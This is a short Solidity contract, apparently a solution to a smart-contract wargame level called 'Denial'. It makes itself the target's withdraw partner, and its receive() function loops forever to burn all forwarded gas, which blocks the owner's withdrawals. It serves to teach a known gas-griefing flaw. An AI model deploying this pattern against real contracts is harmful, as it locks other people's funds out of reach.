// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract WithdrawDenial {
    Denial public denial;

    constructor(address _address) {
        denial = Denial(payable(_address));
        denial.setWithdrawPartner(address(this));
    }

    //   function attack() public {
    //        withdraw()
    //   }

    receive() external payable {
        uint here = 0;
        while (true) {
            // forever in here
            here++;
        }
    }
}
